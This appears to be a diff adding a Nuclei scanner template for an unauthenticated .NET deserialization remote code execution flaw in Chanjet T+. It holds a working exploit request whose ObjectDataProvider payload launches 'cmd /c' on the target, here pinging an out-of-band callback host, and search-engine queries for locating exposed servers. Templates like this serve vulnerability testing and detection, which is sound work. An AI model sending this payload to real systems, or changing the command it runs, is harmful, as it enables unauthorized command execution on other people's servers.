@@ -1,0 +1,35 @@
+
+id: chanjet-Tplus-rce-oob-GetStoreWarehouseByStore
+
+info:
+  name: chanjet-Tplus-rce-oob-GetStoreWarehouseByStore
+  author: p1z
+  severity: critical
+  description: |
+     畅捷通 T+ 存在.net反序列化漏洞，未经过身份认证的攻击者可以通过构造恶意的序列化请求在目标服务器上执行任意命令。
+  reference:
+    https://blog.csdn.net/qq_41904294/article/details/131350965
+  metadata:
+    fofa-query: app="畅捷通-TPlus"
+    hunter-query: app.name="畅捷通 T+"
+    verified: true
+  tags: 2023,chanjet-Tplus,rce
+
+variables:
+  dns: "{{interactsh-url}}"
+  cmd: "ping {{dns}}"
+
+requests:
+  - raw:
+      - |
+        POST /tplus/ajaxpro/Ufida.T.CodeBehind._PriorityLevel,App_Code.ashx?method=GetStoreWarehouseByStore HTTP/1.1
+        Host: {{Hostname}}
+        X-Ajaxpro-Method: GetStoreWarehouseByStore
+        
+        {"storeID": {"__type": "System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35", "MethodName": "Start", "ObjectInstance": {"__type": "System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089", "StartInfo": {"__type": "System.Diagnostics.ProcessStartInfo, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089", "FileName": "cmd", "Arguments": "/c {{cmd}}"}}}}
+
+    matchers:
+      - type: dsl
+        dsl:
+          - contains(interactsh_protocol, "dns")
+        condition: and
